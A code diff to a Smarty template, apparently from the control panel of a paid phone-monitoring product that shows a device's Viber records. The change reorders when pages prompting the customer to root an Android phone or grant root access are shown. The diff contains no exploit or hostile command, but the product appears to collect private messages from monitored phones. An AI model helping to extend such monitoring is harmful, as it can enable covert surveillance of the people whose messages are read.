@@ -17,7 +17,12 @@
 
     {if !$paid}
         {insert "cp/updatePackage.html"}
+    {elseif $di.currentDevice.os=='android' && !$di.currentDevice.rooted}
+        {include "content/{$di.t->getLocale()}/rootPhone.html"}
     {elseif $hasRecords}
+        {if $di.currentDevice.os=='android' && $di.currentDevice.rooted && !$di.currentDevice.rootAccess}
+            {include "content/{$di.t->getLocale()}/rootAccessPhone.html"}
+        {/if}
     <div class="row">
         <div class="col-lg-6 col-md-6 col-sm-6 pull-right">
             <div class="daterangepickerWrapper">
@@ -327,9 +332,10 @@
     {else}
         {if $di.currentDevice.os=='android' && !$di.currentDevice.rooted}
             {include "content/{$di.t->getLocale()}/rootPhone.html"}
-        {elseif $di.currentDevice.os=='android' && $di.currentDevice.app_version > 6 && $di.currentDevice.rooted && !$di.currentDevice.rootAccess}   
-            {include "content/{$di.t->getLocale()}/rootAccessPhone.html"}
         {else}
+            {if $di.currentDevice.os=='android' && $di.currentDevice.rooted && !$di.currentDevice.rootAccess}
+                {include "content/{$di.t->getLocale()}/rootAccessPhone.html"}
+            {/if}
             {include "content/{$di.t->getLocale()}/noDataTitle.html"
                 moduleName = $di.t->_('Viber')
             }
